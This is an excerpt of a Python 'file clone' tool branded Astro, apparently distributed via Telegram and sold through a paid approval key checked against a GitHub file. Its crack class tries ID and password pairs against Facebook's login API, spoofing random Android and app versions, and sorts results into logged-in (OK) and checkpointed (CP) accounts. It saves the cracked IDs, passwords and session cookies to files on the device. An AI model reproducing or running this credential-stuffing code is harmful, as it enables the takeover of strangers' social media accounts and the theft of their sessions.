...
try:
#=====[========GIFT=========]=============#
#FILE CLONE SCRIPT GIFT BY ASTRO CODE
#TALEGRAM CHANNEL NANE : ASTRO CODE
#MY BIRTHDAY GIFT
...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO ASTRO WORLD          ')
...
logo = (f''   _____            __                  ____   ____.__        
  /  _  \   _______/  |________  ____   \   \ /   /|__|_____  
 /  /_\  \ /  ___/\   __\_  __ \/  _ \   \   Y   / |  \____ \ 
/    |    \\___ \  |  |  |  | \(  <_> )   \     /  |  |  |_> >
\____|__  /____  > |__|  |__|   \____/     \___/   |__|   __/ 
        \/     \/                                     |__|    \x1b[1;92m[\x1b[1;97mV 4.3\x1b[1;92m
	
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mAuthor     \x1b[1;97m● \033[38;5;46mAstro Code / Ashik
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mGuthub   \x1b[1;97m  ● \033[38;5;46mhttps://github.com/galaxy90v8
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mVersion    \x1b[1;97m● \x1b[1;97mV/9.9
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mTool Type \x1b[1;97m● \033[38;5;46mRandom\x1b[38;5;196m+\033[1;41m\033[1;97m\x1b[38;5;196m\033[47mFile Clone\x1b[0m\x1b[38;5;196m
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mStatus \x1b[1;97m● \033[38;5;46mPREMIUM
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
def linex():
        print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DAYS 250 TK 30 DAYS 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] TO BUY SUBSCRIPTION CLICK ENTAR""")
...
while attemps < 12345677901:
    ...
    if username == 'user-no-3829' and password == 'happy-user-3829':
...
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = "KPL("+str(os.getuid())+"(KILLER)"+str(os.getuid())+")ASTRO"
  id = '-'.join(uuid)
  try:
    httpCaht = requests.get('https://github.com/galaxy90v8/Astro-Code/blob/main/Astro.txt').text
    if id in httpCaht:
      print(fuckyoursali)
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back Astro Menu ")
        exit()
def menu():   
    os.system('clear')
    print(logo)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mASTROM1\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ASTRO-OK] {sid} | {ps} ")
				#	#{S}\n[cookie[🔥]={ckkk}
                    oks.append(sid)
                    open('/sdcard/ASTRO_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Asif_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [ASTRO-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/ASTRO_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mASTROM3\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
    ...
    def methodD(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[ASTRO] \033[1;33m{loop} \033[1;32m| \033[1;34mM4 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
